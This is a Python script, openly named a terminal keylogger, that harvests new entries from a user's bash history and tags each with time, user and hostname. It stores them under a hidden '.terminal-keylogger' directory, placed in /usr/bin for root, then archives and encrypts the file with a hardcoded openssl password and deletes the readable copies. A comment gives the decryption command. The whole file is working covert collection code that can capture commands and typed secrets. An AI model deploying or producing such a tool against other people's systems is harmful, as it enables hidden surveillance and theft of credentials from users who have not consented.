import os
import socket
import tarfile
import getpass
from datetime import datetime

def modify_bash_history(input_file, output_file):
    # We check if output file exists
    if os.path.exists(output_file):
        # Read the existing modified bash history file
        with open(output_file, 'r') as f:
            existing_lines = set(f.readlines())
    else:
        existing_lines = set()

    # Then we read the original bash history file
    with open(input_file, 'r') as f:
        bash_history = f.readlines()

    # We look for new lines to append to the file
    new_lines = []
    for line in bash_history:
        if line not in existing_lines:
            new_lines.append(line)

    # Modifying new lines
    modified_new_lines = []
    for line in new_lines:
        if ":~$" in line and "T" in line and "- BY" in line:
            modified_new_lines.append(line)
        else:
            hostname = socket.gethostname()
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            username = getpass.getuser()
            modified_new_lines.append(f":~$ {line.rstrip()} T {timestamp} - BY {username}@{hostname}\n")

    # Append modified new lines to the output file
    with open(output_file, 'a') as f:
        f.writelines(modified_new_lines)

if __name__ == "__main__":
    hostname = socket.gethostname()
    # Get the current username
    username = getpass.getuser()
    if username == "root":
        input_file = "/root/.bash_history"
    else:
        input_file = f"/home/{username}/.bash_history"
    
    # Determine output directory based on user
    if username == "root":
        output_directory = "/usr/bin/.terminal-keylogger/"
    else:
        output_directory = f"/home/{username}/.terminal-keylogger/"

    # Ensure the output directory exists
    os.makedirs(output_directory, exist_ok=True)

    # Construct the path for the output file
    output_file = os.path.join(output_directory, f'termkeys-{username}on{hostname}.md')

    # Modify bash history and append new lines to the output file
    modify_bash_history(input_file, output_file)

    # Archive the modified file into a tar archive
    archive_file = output_file + '.tar.gz'
    with tarfile.open(archive_file, 'w:gz') as tar:
        tar.add(output_file)

    # Remove the original modified file
    os.remove(output_file)

    # Encrypt the tar archive with a password using PBKDF2 key derivation
    password = "your_password"  # Replace this with your own password
    encrypted_file = output_file + '.tar.gz.enc'
    os.system(f'openssl aes-256-cbc -a -salt -pbkdf2 -in {archive_file} -out {encrypted_file} -k {password}')

    # Remove the original tar archive
    os.remove(archive_file)

    #print("___")
    
    
    # Command To Decrypt - 
    # openssl aes-256-cbc -d -a -salt -pbkdf2 -in termkeys-attackvector99onsoren.md.tar.gz.enc -out output_file.tar.gz -k your_password